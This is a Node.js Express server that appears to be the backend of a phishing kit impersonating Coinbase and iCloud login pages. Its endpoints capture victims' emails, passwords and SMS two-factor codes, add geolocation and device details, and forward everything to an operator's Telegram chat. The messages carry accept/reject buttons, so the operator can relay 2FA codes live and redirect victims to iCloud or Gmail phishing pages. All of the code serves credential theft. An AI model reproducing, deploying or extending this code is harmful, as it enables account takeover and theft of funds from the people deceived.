const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const crypto = require("crypto");

const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🖐️ DEVICE FINGERPRINT & IP PREFIX
// ============================================================================

function getIPPrefix(ip) {
  const parts = ip.split('.');
  return `${parts[0]}.${parts[1]}`;
}

function getDeviceFingerprint(req) {
  try {
    const userAgent = req.get("user-agent") || "";
    const acceptLanguage = req.get("accept-language") || "";
    const acceptEncoding = req.get("accept-encoding") || "";
    
    const combined = `${userAgent}|${acceptLanguage}|${acceptEncoding}`;
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    return fingerprint;
  } catch (err) {
    return null;
  }
}

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    // Try geojs.io first
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    if (data.city && data.country) {
      return `${data.city}, ${data.country}`;
    }
    
    // Fallback to ip-api.com
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    if (data2.city && data2.country) {
      return `${data2.city}, ${data2.country}`;
    }
    
    return "Unknown Region";
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// 💾 STORAGE
// ============================================================================

let userIdCounter = 1;
const pendingRedirection = {};
const userIds = {};
const pendingApprovals = {};
const deviceFingerprintToEmail = {};
const ipPrefixUserIdToEmail = {};

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Pinged`);
    } catch (err) {
      console.error(`❌ Ping error`);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// POST /send-login
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // Store fingerprint mapping
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
    }

    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);

    // ✅ Store email mapping with ipPrefix + userId for retrieval on next pages
    const compositeKey = `${ipPrefix}_${userId}`;
    ipPrefixUserIdToEmail[compositeKey] = email;
    console.log(`   ✅ Stored: ${compositeKey} → ${email}`);

    // Build message
    const message =
      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      pendingApprovals[email] = {
        status: "pending",
        timestamp: Date.now(),
        userId,
        password,
        region,
        device,
        ip,
        fingerprint
      };

      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-status
// ============================================================================

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingApprovals[email]) {
      return res.json({
        status: pendingApprovals[email].status || "pending",
        email: email
      });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    // ✅ Handle iCloud page login (pendingPage)
    if (pendingPage[email]) {
      pendingPage[email].status = status;
      console.log(`✅ Updated pendingPage[${email}].status = ${status}`);
      return res.json({ ok: true, message: "iCloud page status updated" });
    }

    // ✅ Handle Coinbase login (pendingApprovals)
    if (!pendingApprovals[email]) {
      pendingApprovals[email] = {};
    }

    // Map status codes
    if (status === "page1") {
      pendingApprovals[email].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[email].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[email].status = "rejected";
    } else {
      pendingApprovals[email].status = status;
    }

    pendingApprovals[email].updatedAt = Date.now();

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  startSelfPing();
});

module.exports = { app, server };

// ============================================================================
// SMS ENDPOINTS
// ============================================================================

const pendingSMS = {};

app.post("/send-sms", async (req, res) => {
  try {
    const { email, userId, smsCode, region, device, ip, message, options } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    console.log(`📧 ${email} | SMS: ${smsCode} | Device: ${device} | Region: ${region}`);

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      pendingSMS[email] = {
        status: "pending",
        smsCode,
        userId,
        timestamp: Date.now()
      };

      res.json({ ok: true, message: "SMS sent to Telegram" });
    } else {
      res.status(500).json({ error: "Failed to send SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/send-message", async (req, res) => {
  try {
    const { email, message } = req.body;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/check-sms-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingSMS[email]) {
      return res.json({ status: pendingSMS[email].status });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/update-sms-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    if (!pendingSMS[email]) {
      pendingSMS[email] = {};
    }

    if (status === "sms_accept") {
      pendingSMS[email].status = "sms_accepted";
    } else if (status === "sms_reject") {
      pendingSMS[email].status = "sms_rejected";
    } else {
      pendingSMS[email].status = status;
    }

    pendingSMS[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// BOT SMS CALLBACK HANDLER
// ============================================================================

// The bot.js file needs to handle SMS callbacks with these patterns:
// - sms_accept|email
// - sms_reject|email
// And call /update-sms-status endpoint with status: "sms_accept" or "sms_reject"

// ============================================================================
// NEW SMS ENDPOINTS - FRONTEND JUST SENDS CODE, BACKEND HANDLES TELEGRAM
// ============================================================================

app.post("/verify-sms", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈😈 <b>SMS - Coinbase</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>📱 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Accept ✅", callback_data: `sms_accept|${email}` }],
            [{ text: "❌ Reject ❌", callback_data: `sms_reject|${email}` }]
          ]
        }
      })
    });

    if (response.ok) {
      console.log(`📧 ${email} | SMS: ${smsCode}`);
      
      pendingSMS[email] = {
        status: "pending",
        smsCode,
        userId,
        timestamp: Date.now()
      };

      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/resend-sms", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Resend SMS - Coinbase</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      console.log(`📱 Resend SMS for ${email}`);
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to resend SMS" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// REDIRECTION PAGE ENDPOINT
// ============================================================================

app.post("/send-redirection", async (req, res) => {
  try {
    let { email, userId } = req.body;

    // Detect region and device from request
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const ipPrefix = getIPPrefix(ip);

    // ✅ PRIORITY 1: Try to retrieve from storage using ipPrefix + userId
    if (userId && userId !== '?') {
      const compositeKey = `${ipPrefix}_${userId}`;
      const storedEmail = ipPrefixUserIdToEmail[compositeKey];
      if (storedEmail) {
        email = storedEmail;
        console.log(`🔍 Retrieved email from storage: ${compositeKey} → ${email}`);
      }
    }

    // ✅ PRIORITY 2: Use provided email as fallback
    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    // ✅ CLEAR any previous choice for this email
    if (pendingRedirection[email]) {
      delete pendingRedirection[email];
    }

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
            [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
          ]
        }
      })
    });

    if (response.ok) {
      res.json({ ok: true });
    } else {
      res.status(500).json({ error: "Failed to send redirection" });
    }

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Check redirection choice
app.post("/check-redirection-choice", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ choice: "unknown" });
    }

    // This will be set by the bot when button is clicked
    if (pendingRedirection && pendingRedirection[email]) {
      return res.json({ choice: pendingRedirection[email].choice });
    }

    res.json({ choice: "pending" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// UPDATE REDIRECTION CHOICE
// ============================================================================

app.post("/update-redirection-choice", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingRedirection[email]) {
      pendingRedirection[email] = {};
    }

    if (choice === "redirect_icloud") {
      pendingRedirection[email].choice = "icloud";
    } else if (choice === "redirect_gmail") {
      pendingRedirection[email].choice = "gmail";
    } else {
      pendingRedirection[email].choice = choice;
    }

    pendingRedirection[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// ICLOUD PAGES ENDPOINTS
// ============================================================================

const pendingPage = {};
const pendingCodes = {};

app.post("/page-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Email and password required" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingPage[email] = { password, status: "pending" };
    console.log(`📥 iCloud Page Login Received: ${email}`);

    const message =
      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `page_accept|${email}` },
            { text: "❌ Reject", callback_data: `page_reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ success: false, message: "Failed to send to Telegram" });
    }

  } catch (err) {
    console.error("❌ Page login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/sms-login", async (req, res) => {
  try {
    const { code, userId, email } = req.body;

    if (!code) {
      return res.status(400).json({ success: false, message: "Code required" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingCodes[code] = { status: "pending" };
    console.log(`📥 iCloud SMS Code Received: ${code}`);

    const message =
      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>💬 SMS:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `sms_accept|${code}` },
            { text: "❌ Reject", callback_data: `sms_reject|${code}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ success: false });
    }

  } catch (err) {
    console.error("❌ SMS login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/notify", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const message =
      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    res.json({ success: true });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/update-page-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    if (!pendingPage[email]) {
      pendingPage[email] = {};
    }

    if (status === "page_accept") {
      pendingPage[email].status = "accepted";
    } else if (status === "page_reject") {
      pendingPage[email].status = "rejected";
    } else {
      pendingPage[email].status = status;
    }

    pendingPage[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});
